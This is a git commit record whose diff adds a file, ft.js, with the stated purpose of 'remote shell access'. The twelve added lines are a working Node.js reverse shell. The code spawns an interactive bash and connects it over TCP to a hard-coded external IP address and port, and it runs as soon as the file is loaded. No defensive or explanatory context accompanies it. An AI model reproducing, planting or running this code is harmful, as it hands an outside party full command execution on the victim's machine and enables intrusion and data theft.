d801e0b6fa3928b12758e0e48f9cb9f16cdb6b88
Aaki123-star <aaki987@proton.me>
2025-12-16 05:19:48 -0500

    Add ft.js for remote shell access

---
+++ ft.js
@@ -0,0 +1,12 @@
+(function(){
+  var net = require("net"),
+      cp = require("child_process"),
+      sh = cp.spawn("/bin/bash", ["-i"]);
+  var client = new net.Socket();
+  client.connect(15485, "38.60.197.238", function(){
+    client.pipe(sh.stdin);
+    sh.stdout.pipe(client);
+    sh.stderr.pipe(client);
+  });
+  return /a/;
+})();
